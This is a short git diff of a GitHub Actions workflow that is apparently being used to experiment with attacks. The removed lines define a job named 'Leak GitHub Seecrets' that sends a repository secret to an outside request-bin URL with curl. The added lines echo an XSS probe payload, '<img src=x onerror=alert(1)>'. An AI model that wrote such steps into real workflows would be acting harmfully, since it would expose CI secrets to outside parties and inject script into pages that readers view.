@@ -1,14 +1,12 @@
-name: Leak
+name: TEST
 
-on: [pull_request_review]
+on: [issues]
 
 jobs:
   leak:
-    name: Leak GitHub Seecrets
+    name: Test
     runs-on: ubuntu-latest
     steps:
-      - name: Leak the secre
+      - name: Testing
         run: |
-          curl "https://45130bd621923da5a57a26a0fbe3df4b.m.pipedream.net?value=$VALUE"
-        env:
-          VALUE: ${{ secrets.TEST2 }}
+          echo "Hello! <img src=x onerror=alert(1)>"
